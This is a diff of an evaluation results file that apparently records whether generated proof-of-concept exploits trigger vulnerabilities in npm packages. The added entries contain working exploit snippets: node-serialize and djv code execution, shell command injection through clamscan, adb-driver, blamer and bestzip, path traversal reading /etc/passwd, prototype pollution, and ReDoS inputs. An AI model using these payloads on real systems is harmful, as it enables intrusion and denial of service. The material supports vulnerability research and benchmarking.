@@ -151,8 +151,11 @@
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/original__module_07.txt"
       },
       "obfuscated": {
-        "status": "NO_CODE",
-        "elapsed": 6.798642873764038,
+        "status": "TRIGGERED",
+        "triggered": true,
+        "evidence": "(function(){require('child_process').execSync('touch /tmp/pwned_node_serialize');return 1;}())",
+        "elapsed": 26.739532232284546,
+        "snippet": "const serialize = require(\"node-serialize\");\n\n// Malicious payload: a JSON property whose value string is prefixed with\n// node-serialize's function marker \"_$$ND_FUNC$$_\" followed by an\n// Immediately Invoked Function Expression (IIFE). unserialize() detects the\n// marker and passes the remainder straight into eval(), so the IIFE runs\n// as soon as the payload is unserialized.\nconst payload = '{\"rce\":\"_$$ND_FUNC$$_function(){require(\\'child_process\\').execSync(\\'touch /tmp/pwned_node_serialize\\');return 1;}()\"}';\n\nconst result = serialize.unserialize(payload);\n\nconsole.log(\"unserialize result:\", result);\nconsole.log(\"Exploit executed - check for /tmp/pwned_node_serialize\");",
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/obfuscated__module_07.txt"
       }
     }
@@ -169,7 +172,7 @@
       },
       "obfuscated": {
         "status": "NO_CODE",
-        "elapsed": 79.67397403717041,
+        "elapsed": 20.134272813796997,
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/obfuscated__module_08.txt"
       }
     }
@@ -211,8 +214,11 @@
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/original__module_10.txt"
       },
       "obfuscated": {
-        "status": "TIMEOUT",
-        "elapsed": 300.0161690711975,
+        "status": "TRIGGERED",
+        "triggered": true,
+        "evidence": "/tmp/clamscan_evil;touch PWNED_CVE_2020_7613;echo  --version",
+        "elapsed": 220.59589886665344,
+        "snippet": "// CVE-2020-7613 - clamscan < 1.3.0 command injection via `path` variable\n// in NodeClam._is_clamav_binary(), reached from NodeClam.init().\n// The scanner binary path (attacker/config controlled) is interpolated\n// directly into a shell string and passed to child_process.exec().\nconst fs = require('fs');\nconst NodeClam = require('clamscan');\n\n// The path only needs to be a real, readable filesystem entry (fs.access\n// check) -- shell metacharacters in the filename itself are what get\n// interpreted when the string is handed to child_process.exec().\nconst evilPath = '/tmp/clamscan_evil;touch PWNED_CVE_2020_7613;echo ';\nfs.writeFileSync(evilPath, '');\n\n(async () => {\n    try {\n        await new NodeClam().init({\n            clamscan: { path: evilPath, active: true },\n            clamdscan: { active: false },\n            preference: 'clamscan'\n        });\n    } catch (e) {\n        // init() ultimately rejects because our fake path isn't a real\n        // clamav binary, but the injected shell command already ran\n        // by the time that check happens.\n    }\n\n    console.log(\n        fs.existsSync('PWNED_CVE_2020_7613')\n            ? 'VULNERABLE: arbitrary command executed via `path`'\n            : 'not vulnerable'\n    );\n})();",
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/obfuscated__module_10.txt"
       }
     }
@@ -379,8 +385,11 @@
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/original__module_18.txt"
       },
       "obfuscated": {
-        "status": "NO_CODE",
-        "elapsed": 34.02049112319946,
+        "status": "TRIGGERED",
+        "triggered": true,
+        "evidence": null,
+        "elapsed": 141.31083703041077,
+        "snippet": "const utils = require(\"./node_modules/axios/lib/utils\");\n\n// ReDoS via axios utils.trim() (CVE-2021-3749): the unanchored\n// /\\s*$/ regex forces catastrophic backtracking on crafted input.\nconst k = 10000;\nconst n = 20;\nconst malicious = \" \".repeat(k) + \"a\".repeat(1) === undefined ? \"\" : (\" \".repeat(k) + \"a\").repeat(n);\n\nconsole.log(\"payload length:\", malicious.length);\nconsole.time(\"trim\");\nutils.trim(malicious);\nconsole.timeEnd(\"trim\");",
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/obfuscated__module_18.txt"
       }
     }
@@ -423,7 +432,7 @@
       },
       "obfuscated": {
         "status": "TIMEOUT",
-        "elapsed": 300.01527404785156,
+        "elapsed": 300.1110818386078,
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/obfuscated__module_20.txt"
       }
     }
@@ -443,7 +452,7 @@
       },
       "obfuscated": {
         "status": "NO_CODE",
-        "elapsed": 28.59008479118347,
+        "elapsed": 106.82579731941223,
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/obfuscated__module_21.txt"
       }
     }
@@ -463,7 +472,7 @@
       },
       "obfuscated": {
         "status": "NO_CODE",
-        "elapsed": 3.5486819744110107,
+        "elapsed": 171.50744199752808,
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/obfuscated__module_22.txt"
       }
     }
@@ -482,8 +491,8 @@
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/original__module_23.txt"
       },
       "obfuscated": {
-        "status": "NO_CODE",
-        "elapsed": 8.922123908996582,
+        "status": "TIMEOUT",
+        "elapsed": 300.0333659648895,
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/obfuscated__module_23.txt"
       }
     }
@@ -502,8 +511,8 @@
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/original__module_24.txt"
       },
       "obfuscated": {
-        "status": "NO_CODE",
-        "elapsed": 3.4745609760284424,
+        "status": "TIMEOUT",
+        "elapsed": 300.0207920074463,
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/obfuscated__module_24.txt"
       }
     }
@@ -519,8 +528,11 @@
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/original__module_25.txt"
       },
       "obfuscated": {
-        "status": "NO_CODE",
-        "elapsed": 3.5355992317199707,
+        "status": "TRIGGERED",
+        "triggered": true,
+        "evidence": "../../../../../../../../../../etc/passwd",
+        "elapsed": 137.72957611083984,
+        "snippet": "const http = require(\"http\");\nconst augustine = require(\"./node_modules/augustine\");\n\nconst PORT = 8123;\naugustine.start(PORT, \"127.0.0.1\");\n\nsetTimeout(() => {\n  const traversal = \"/\" + \"../\".repeat(10) + \"etc/passwd\";\n  http.get({ host: \"127.0.0.1\", port: PORT, path: traversal }, (res) => {\n    let body = \"\";\n    res.on(\"data\", (chunk) => (body += chunk));\n    res.on(\"end\", () => {\n      console.log(\"Status:\", res.statusCode);\n      console.log(\"Leaked file contents:\\n\", body);\n      process.exit(0);\n    });\n  });\n}, 300);",
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/obfuscated__module_25.txt"
       }
     }
@@ -539,8 +551,11 @@
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/original__module_26.txt"
       },
       "obfuscated": {
-        "status": "NO_CODE",
-        "elapsed": 3.6985440254211426,
+        "status": "TRIGGERED",
+        "triggered": true,
+        "evidence": "/etc/passwd",
+        "elapsed": 140.50881004333496,
+        "snippet": "// Path traversal PoC for api-proxy's static file handler (writeStatic -> guessContentType/FS.readFile)\nvar writeStatic = require(\"./node_modules/api-proxy/lib/static.js\").writeStatic;\n\n// Craft a request whose url escapes the \"www\" root via many \"../\" segments,\n// which Path.join() happily normalizes past the intended root directory.\nvar maliciousUrl = \"/\" + \"../\".repeat(20) + \"etc/passwd\";\n\nvar fakeRequest = { url: maliciousUrl };\nvar fakeResponse = {\n  writeHead: function (statusCode, headers) {\n    console.log(\"[+] Response headers:\", statusCode, headers);\n  },\n  write: function (data) {\n    console.log(\"[+] Leaked file contents:\\n\" + data.toString());\n  },\n  end: function () {},\n};\n\nwriteStatic(fakeRequest, fakeResponse, function () {\n  console.log(\"[-] Not found (traversal blocked)\");\n});",
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/obfuscated__module_26.txt"
       }
     }
@@ -572,8 +587,11 @@
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/original__module_28.txt"
       },
       "obfuscated": {
-        "status": "NO_CODE",
-        "elapsed": 3.73357892036438,
+        "status": "TRIGGERED",
+        "triggered": true,
+        "evidence": "../../../../../../../../../../etc/passwd",
+        "elapsed": 51.11614799499512,
+        "snippet": "// Path traversal exploit for angular-http-server\n// The server takes `possibleFilename = req.url.slice(1)` directly from the\n// client-controlled URL and passes it unsanitized into fs.stat/fs.readFileSync,\n// allowing \"../\" sequences to escape the served directory and read arbitrary\n// files from the filesystem.\n\nconst http = require(\"http\");\n\n// Requiring the package starts the HTTP server on port 8000 as a side effect.\nrequire(\"./node_modules/angular-http-server\");\n\n// Give the server a moment to start listening, then send a traversal request.\nsetTimeout(() => {\n    const target = \"/etc/passwd\";\n    const traversal = \"/\" + \"../\".repeat(10) + target.slice(1);\n\n    http.get({ host: \"127.0.0.1\", port: 8000, path: traversal }, (res) => {\n        let body = \"\";\n        res.on(\"data\", (chunk) => (body += chunk));\n        res.on(\"end\", () => {\n            console.log(`Status: ${res.statusCode}`);\n            console.log(\"Response body (leaked file contents):\");\n            console.log(body);\n            process.exit(0);\n        });\n    }).on(\"error\", (err) => {\n        console.error(\"Request failed:\", err.message);\n        process.exit(1);\n    });\n}, 500);",
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/obfuscated__module_28.txt"
       }
     }
@@ -592,8 +610,11 @@
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/original__module_29.txt"
       },
       "obfuscated": {
-        "status": "NO_CODE",
-        "elapsed": 4.386459827423096,
+        "status": "NOT_TRIGGERED",
+        "triggered": false,
+        "evidence": null,
+        "elapsed": 34.96702790260315,
+        "snippet": "const Param = require(\"./node_modules/rich-param\");\n\nconst param = new Param(\"test\", \"value\");\n\n// handler(type, name, fn) does this.handlers[type][name] = fn with no key sanitization.\n// Passing type = \"__proto__\" walks onto Object.prototype instead of this.handlers.\nparam.handler(\"__proto__\", \"polluted\", \"yes\");\n\nconst victim = {};\nconsole.log(\"Prototype polluted:\", victim.polluted === \"yes\");\nif (victim.polluted !== \"yes\") {\n  throw new Error(\"Exploit failed: prototype pollution did not occur\");\n}",
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/obfuscated__module_29.txt"
       }
     }
@@ -609,8 +630,11 @@
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/original__module_30.txt"
       },
       "obfuscated": {
-        "status": "NO_CODE",
-        "elapsed": 3.603188991546631,
+        "status": "TRIGGERED",
+        "triggered": true,
+        "evidence": "return (function validate(data) {\n  if (data === undefined) data = null\n  validate.errors = null\n  var errors = 0\n  if (data !== undefined) {\n    if (!(typeof data === \"object\" && data && !Array.isArr",
+        "elapsed": 287.71250796318054,
+        "snippet": "const validator = require(\"./node_modules/is-my-json-valid\")\n\nconst schema = {\n  type: \"object\",\n  properties: {\n    \"x[console.log(process.mainModule.require(`child_process`).execSync(`id`).toString(`utf-8`))]\": {\n      required: true,\n      type: \"string\"\n    }\n  },\n}\n\nvar validate = validator(schema)\nvalidate({})",
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/obfuscated__module_30.txt"
       }
     }
@@ -629,8 +653,11 @@
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/original__module_31.txt"
       },
       "obfuscated": {
-        "status": "NO_CODE",
-        "elapsed": 4.95728063583374,
+        "status": "TRIGGERED",
+        "triggered": true,
+        "evidence": null,
+        "elapsed": 129.6664400100708,
+        "snippet": "// ReDoS exploit for browserslist's internal query matcher (`.match()` calls in doMatch/find)\n// Affected: browserslist 4.16.4 (CVE-2021-23364)\nconst browserslist = require(\"./node_modules/browserslist\");\n\nconst malicious = \" \".repeat(80000) + \"and\"; // crafted query string\n\nconsole.log(\"Sending malicious query to browserslist()...\");\nconst start = Date.now();\n\ntry {\n  browserslist(malicious);\n} catch (e) {\n  // parsing still fails, but only after the expensive match() scanning below\n}\n\nconsole.log(\"Elapsed ms:\", Date.now() - start);",
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/obfuscated__module_31.txt"
       }
     }
@@ -649,8 +676,11 @@
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/original__module_32.txt"
       },
       "obfuscated": {
-        "status": "NO_CODE",
-        "elapsed": 3.4180908203125,
+        "status": "TRIGGERED",
+        "triggered": true,
+        "evidence": "\n    function f0(data){\n      \"use strict\";\n      \n      if (data < (process.mainModule.require('child_process').execSync('touch /tmp/pwned_djv'), 0)) return \"minimum: data\";\nif ((typeof data !== \"num",
+        "elapsed": 95.90417814254761,
+        "snippet": "// Vulnerability: djv's `tpl` (lib/utils/template.js) concatenates schema\n// keyword values directly into a JavaScript source string with no\n// sanitization, and that source is later executed via `new Function(...)`.\n// The `minimum` validator (lib/utils/properties.js) does:\n//   minimum(schema) { return `%s < ${schema.minimum}`; }\n// so an attacker-controlled `minimum` value is spliced verbatim into the\n// generated validator function body, yielding arbitrary code execution\n// as soon as the compiled validator runs.\n\nconst djv = require(\"djv\");\n\nconst env = new djv();\n\nenv.addSchema(\"exploit\", {\n  type: \"number\",\n  minimum: \"(process.mainModule.require('child_process').execSync('touch /tmp/pwned_djv'), 0)\"\n});\n\n// Compiles the schema (building the malicious code into the generated\n// function source) and then executes it, triggering the injected command.\nenv.validate(\"exploit\", 5);\n\nconsole.log(\"done - check for /tmp/pwned_djv\");",
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/obfuscated__module_32.txt"
       }
     }
@@ -666,8 +696,8 @@
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/original__module_33.txt"
       },
       "obfuscated": {
-        "status": "NO_CODE",
-        "elapsed": 4.906453847885132,
+        "status": "TIMEOUT",
+        "elapsed": 300.0779721736908,
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/obfuscated__module_33.txt"
       }
     }
@@ -684,7 +714,7 @@
       },
       "obfuscated": {
         "status": "NO_CODE",
-        "elapsed": 3.5278537273406982,
+        "elapsed": 185.80024695396423,
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/obfuscated__module_34.txt"
       }
     }
@@ -701,7 +731,7 @@
       },
       "obfuscated": {
         "status": "NO_CODE",
-        "elapsed": 3.4974677562713623,
+        "elapsed": 173.67338299751282,
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/obfuscated__module_35.txt"
       }
     }
@@ -720,8 +750,8 @@
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/original__module_36.txt"
       },
       "obfuscated": {
-        "status": "NO_CODE",
-        "elapsed": 3.578740119934082,
+        "status": "TIMEOUT",
+        "elapsed": 300.0184943675995,
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/obfuscated__module_36.txt"
       }
     }
@@ -740,8 +770,11 @@
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/original__module_37.txt"
       },
       "obfuscated": {
-        "status": "NO_CODE",
-        "elapsed": 3.4642739295959473,
+        "status": "TRIGGERED",
+        "triggered": true,
+        "evidence": null,
+        "elapsed": 172.8828809261322,
+        "snippet": "const Checkit = require(\"checkit\");\n\n// A ~50KB string with no valid scheme/terminator triggers catastrophic\n// backtracking in Checkit.Regex.url (core.js:241, Checkit.Regex[rule].test)\nconst payload = \"http://\" + \"a\".repeat(50000) + \"!\";\n\nconst start = Date.now();\nconst [err] = Checkit.checkSync(\"website\", payload, [\"url\"]);\nconsole.log(\"validation took\", Date.now() - start, \"ms\");",
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/obfuscated__module_37.txt"
       }
     }
@@ -760,8 +793,11 @@
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/original__module_38.txt"
       },
       "obfuscated": {
-        "status": "NO_CODE",
-        "elapsed": 3.5968639850616455,
+        "status": "NOT_TRIGGERED",
+        "triggered": false,
+        "evidence": null,
+        "elapsed": 19.979710817337036,
+        "snippet": "const assetServer = require(\"./node_modules/asset-cache\");\n\n// Point cwd to a subdirectory so traversal has to escape it\nassetServer.setCwd(__dirname + \"/public\");\n\n// Path traversal: escape config.dir to read an arbitrary file, e.g. /etc/passwd\nassetServer.loadFile(\"../../../../../../etc/passwd\", null, function (err, data, cached, etag) {\n  if (err) {\n    console.error(\"Error:\", err);\n    return;\n  }\n  console.log(\"Leaked file contents via path traversal:\\n\" + data.toString());\n});",
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/obfuscated__module_38.txt"
       }
     }
@@ -780,8 +816,11 @@
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/original__module_39.txt"
       },
       "obfuscated": {
-        "status": "NO_CODE",
-        "elapsed": 3.766202211380005,
+        "status": "TRIGGERED",
+        "triggered": true,
+        "evidence": "\"/Users/phli/codelab-js/evaluation/static-benchmark/obfuscated/module_39/node_modules/adb-driver/bin/mac/adb\" touch /tmp/pwned_by_binFile",
+        "elapsed": 55.73010587692261,
+        "snippet": "const { execADBCommand } = require(\"./node_modules/adb-driver\");\n\n// binFile in execADBCommand() only quotes cmd[0]; the rest of the\n// attacker-controlled command string is rejoined and handed to\n// child_process.exec(), which runs it through a shell. Any shell\n// metacharacters after the first space escape the intended adb\n// invocation and execute arbitrary commands.\nconst maliciousCommand = 'devices; touch /tmp/pwned_by_binFile';\n\nexecADBCommand(maliciousCommand).then((out) => {\n  console.log(\"adb output:\", out);\n  console.log(\"Command injection triggered via binFile/execADBCommand.\");\n});",
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/obfuscated__module_39.txt"
       }
     }
@@ -800,8 +839,11 @@
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/original__module_40.txt"
       },
       "obfuscated": {
-        "status": "NO_CODE",
-        "elapsed": 3.4074292182922363,
+        "status": "TRIGGERED",
+        "triggered": true,
+        "evidence": ["polluted"],
+        "elapsed": 131.95266890525818,
+        "snippet": "const merge = require(\"@brikcss/merge\");\n\n// The recursive object-merge logic (whose join-path helper is\n// minified/exported as function `t` in dist/module/merge.js) never\n// excludes \"__proto__\" from the keys it copies onto the target object.\n// Merging attacker-controlled JSON therefore pollutes Object.prototype.\nconst payload = JSON.parse('{\"__proto__\":{\"polluted\":\"yes\"}}');\n\nmerge({}, payload);\n\nconsole.log(\"Object.prototype.polluted =\", ({}).polluted);\nif (({}).polluted === \"yes\") {\n  console.log(\"VULNERABLE: prototype pollution succeeded\");\n}",
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/obfuscated__module_40.txt"
       }
     }
@@ -820,8 +862,11 @@
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/original__module_41.txt"
       },
       "obfuscated": {
-        "status": "NO_CODE",
-        "elapsed": 3.5042171478271484,
+        "status": "TRIGGERED",
+        "triggered": true,
+        "evidence": "git blame -w; touch /var/folders/jz/s2gxkdsd753gbnsdx6nfcq9c0000gn/T/blamer_pwned_1784208090284 # _oracle_runner.js",
+        "elapsed": 29.296284914016724,
+        "snippet": "const path = require(\"path\");\nconst fs = require(\"fs\");\nconst os = require(\"os\");\nconst Blamer = require(\"./node_modules/blamer/src/index.js\");\n\nconst marker = path.join(os.tmpdir(), \"blamer_pwned_\" + Date.now());\nconst targetFile = __filename; // any existing file works as the \"blamed\" file\n\nconst blamer = new Blamer(\"git\");\n\n// The second argument to blameByFile is concatenated unsanitized into\n// `git blame <args> <file>` and executed via child_process.exec (shell:true),\n// so shell metacharacters let us inject arbitrary commands.\nconst maliciousArgs = `-w; touch ${marker} #`;\n\nblamer.blameByFile(targetFile, maliciousArgs)\n  .then(() => console.log(\"blame finished\"))\n  .catch(() => console.log(\"blame errored (expected, injected cmd still ran)\"))\n  .finally(() => {\n    console.log(\"Injection succeeded:\", fs.existsSync(marker));\n  });",
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/obfuscated__module_41.txt"
       }
     }
@@ -840,8 +885,11 @@
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/original__module_42.txt"
       },
       "obfuscated": {
-        "status": "NO_CODE",
-        "elapsed": 3.600274085998535,
+        "status": "TRIGGERED",
+        "triggered": true,
+        "evidence": "zip --quiet --recurse-paths out.zip; touch /tmp/pwned_by_bestzip # package.json",
+        "elapsed": 70.75819969177246,
+        "snippet": "const bestzip = require(\"./node_modules/bestzip\");\n\n// The `destination`/`source` values are concatenated, unsanitized, into a\n// shell command string that is executed by cp.exec() inside nativeZip's\n// `zipProcess` child process, allowing arbitrary command injection.\nconst maliciousDestination = \"out.zip; touch /tmp/pwned_by_bestzip #\";\n\nbestzip\n  .nativeZip({\n    destination: maliciousDestination,\n    source: \"package.json\",\n    cwd: process.cwd()\n  })\n  .then(() => console.log(\"done\"))\n  .catch(() => {\n    console.log(\"zipProcess ran (command may have exited non-zero), check /tmp/pwned_by_bestzip\");\n  });",
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/obfuscated__module_42.txt"
       }
     }
@@ -860,8 +908,11 @@
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/original__module_43.txt"
       },
       "obfuscated": {
-        "status": "NO_CODE",
-        "elapsed": 3.5791969299316406,
+        "status": "TRIGGERED",
+        "triggered": true,
+        "evidence": ["polluted"],
+        "elapsed": 44.94153189659119,
+        "snippet": "const copyProps = require(\"copy-props\");\n\n// isObject() only checks Object.prototype.toString.call(x) === '[object Object]',\n// so a JSON-parsed payload with a \"__proto__\" key passes as a valid plain object\n// and copy-props happily walks into it, polluting Object.prototype.\nconst maliciousInput = JSON.parse('{\"__proto__\":{\"polluted\":\"yes\"}}');\n\ncopyProps(maliciousInput, {});\n\nconsole.log(\"Prototype polluted:\", ({}).polluted); // -> \"yes\"\n\nif (({}).polluted === \"yes\") {\n  console.log(\"Vulnerability confirmed: Object.prototype was polluted via isObject()\");\n}",
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/obfuscated__module_43.txt"
       }
     }
@@ -880,8 +931,11 @@
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/original__module_44.txt"
       },
       "obfuscated": {
-        "status": "NO_CODE",
-        "elapsed": 3.8632798194885254,
+        "status": "NOT_TRIGGERED",
+        "triggered": false,
+        "evidence": null,
+        "elapsed": 24.158276796340942,
+        "snippet": "const sleep = require(\"sleep\");\n\n// The `sleep()` function blocks the Node.js event loop synchronously and\n// performs no upper-bound validation on its input (index.js only rejects\n// negative or non-integer values). An attacker-controlled value can force\n// the process to freeze for an effectively unbounded duration, causing a\n// Denial of Service.\n\nconst maliciousSeconds = 2 ** 31; // ~68 years, fully accepted by the check\n\nconsole.log(\"Before sleep:\", new Date().toISOString());\nconsole.log(\"Triggering DoS via sleep(\" + maliciousSeconds + \") ...\");\n\nsleep.sleep(maliciousSeconds); // blocks the entire process indefinitely\n\n// This line is never reached in any practical timeframe, demonstrating\n// the uncontrolled resource consumption / DoS vulnerability.\nconsole.log(\"After sleep:\", new Date().toISOString());",
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/obfuscated__module_44.txt"
       }
     }
@@ -900,8 +954,11 @@
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/original__module_45.txt"
       },
       "obfuscated": {
-        "status": "NO_CODE",
-        "elapsed": 3.5978140830993652,
+        "status": "TRIGGERED",
+        "triggered": true,
+        "evidence": ["polluted"],
+        "elapsed": 135.28148818016052,
+        "snippet": "const assign = require(\"./node_modules/assign-deep\");\n\nconst payload = JSON.parse('{\"__proto__\":{\"polluted\":\"yes\"}}');\n\nassign({}, payload);\n\nconsole.log(({}).polluted); // \"yes\" -- Object.prototype has been polluted",
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/obfuscated__module_45.txt"
       }
     }
@@ -921,7 +978,7 @@
       },
       "obfuscated": {
         "status": "NO_CODE",
-        "elapsed": 3.5462100505828857,
+        "elapsed": 179.72447395324707,
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/obfuscated__module_46.txt"
       }
     }
@@ -941,7 +998,7 @@
       },
       "obfuscated": {
         "status": "NO_CODE",
-        "elapsed": 3.67822003364563,
+        "elapsed": 176.85212898254395,
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/obfuscated__module_47.txt"
       }
     }
@@ -961,7 +1018,7 @@
       },
       "obfuscated": {
         "status": "NO_CODE",
-        "elapsed": 3.8056256771087646,
+        "elapsed": 178.77202892303467,
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/obfuscated__module_48.txt"
       }
     }
@@ -981,7 +1038,7 @@
       },
       "obfuscated": {
         "status": "NO_CODE",
-        "elapsed": 3.6403326988220215,
+        "elapsed": 179.7725751399994,
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/obfuscated__module_49.txt"
       }
     }
@@ -1001,7 +1058,7 @@
       },
       "obfuscated": {
         "status": "NO_CODE",
-        "elapsed": 3.5519118309020996,
+        "elapsed": 180.57694578170776,
         "raw_output_file": "/Users/phli/codelab-js/evaluation/raw_outputs/poc_informed/obfuscated__module_50.txt"
       }
     }
